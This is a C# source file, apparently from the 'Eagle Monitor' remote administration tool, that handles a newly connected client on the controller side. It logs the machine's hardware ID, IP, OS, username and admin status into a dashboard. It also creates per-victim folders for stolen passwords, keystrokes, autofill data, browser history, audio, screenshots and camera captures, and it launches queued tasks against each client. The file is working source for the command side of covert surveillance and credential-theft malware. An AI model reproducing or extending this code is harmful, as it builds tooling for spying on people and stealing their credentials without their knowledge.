using EagleMonitor.Networking;
using EagleMonitor.Utils;
using Eagle_Monitor_Tasks_Configurator;
using PacketLib.Packet;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Media;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class ConnectedPacketHandler
    {
        public ConnectedPacketHandler(ConnectedPacket connectedPacket, ClientHandler clientHandler)
        {
       
             new Thread(() =>
             {
                 clientHandler.HWID = connectedPacket.HWID;
                 connectedPacket.baseIp = clientHandler.IP;
                 clientHandler.SendPacket(new BaseIpPacket(clientHandler.IP));

                 if (Miscellaneous.settings.notificationSound)
                 {
                     byte[] sound = File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Notification\\notification.wav");
                     using (MemoryStream ms = new MemoryStream(sound))
                     {
                         SoundPlayer player = new SoundPlayer(ms);
                         player.Play();
                     }
                 }

                 if (!Directory.Exists(Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID))
                 {
                     Directory.CreateDirectory(Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID);
                     clientHandler.clientStatus = "New client connected !";
                 }
                 else
                 {
                     clientHandler.clientStatus = "Old client connected !";
                 }

                 clientHandler.clientPath = Miscellaneous.GPath + "\\Clients\\" + connectedPacket.Username + "@" + connectedPacket.HWID;
                 clientHandler.fullName = connectedPacket.Username + "@" + connectedPacket.HWID;

                 Directory.CreateDirectory(clientHandler.clientPath + "\\Downloaded Files\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\History\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Autofill\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Keystrokes\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Keywords\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Passwords\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Audio Records\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Screenshots\\");
                 Directory.CreateDirectory(clientHandler.clientPath + "\\Camera\\");

                 Program.mainForm.dataGridView1.BeginInvoke((MethodInvoker)(() =>
                 {
                     int rowId = Program.mainForm.dataGridView1.Rows.Add();

                     DataGridViewRow row = Program.mainForm.dataGridView1.Rows[rowId];

                     if (File.Exists(Miscellaneous.GPath + $"\\Flags\\{Miscellaneous.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"))
                         row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + $"\\Flags\\{Miscellaneous.settings.flagsPackName}\\" + connectedPacket.RegionFlag.ToLower() + ".png"), new Size(26, 26));
                     else
                         row.Cells["Column1"].Value = Miscellaneous.resizeImage(Image.FromFile(Miscellaneous.GPath + "\\Flags\\FlagsBase\\" + "UKN" + ".png"), new Size(26, 26));

                     row.Cells["Column2"].Value = connectedPacket.HWID;
                     row.Cells["Column3"].Value = clientHandler.IP;
                     row.Cells["Column4"].Value = connectedPacket.OSName;
                     row.Cells["Column5"].Value = connectedPacket.Username;
                     row.Cells["Column6"].Value = connectedPacket.RAM;
                     row.Cells["Column7"].Value = connectedPacket.RegionName;
                     row.Cells["Column8"].Value = connectedPacket.Privilege;
                     row.Cells["Column9"].Value = connectedPacket.Is64Bit;

                     if (connectedPacket.Is64Bit == "32")
                     {
                         clientHandler.is64bitClient = false;
                     }
                     else
                     {
                         clientHandler.is64bitClient = true;
                     }

                     if (connectedPacket.Privilege == "User")
                     {
                         clientHandler.isAdmin = false;
                     }
                     else 
                     {
                         clientHandler.isAdmin = true;
                     }

                     row.Cells["Column10"].Value = clientHandler.serverPort.ToString();
                     clientHandler.clientRow = row;
                     Program.mainForm.dataGridView1.ClearSelection();
                     //connectedPacket = null;

                 }));

                 if (StartupTaskHandler.startupTaskExisting)
                 {
                     foreach (ITasks task in StartupTaskHandler.allTask)
                     {
                         new StartupTaskHandler(task, clientHandler);
                     }
                 }
                 return;
             }).Start();
        }
    }
}
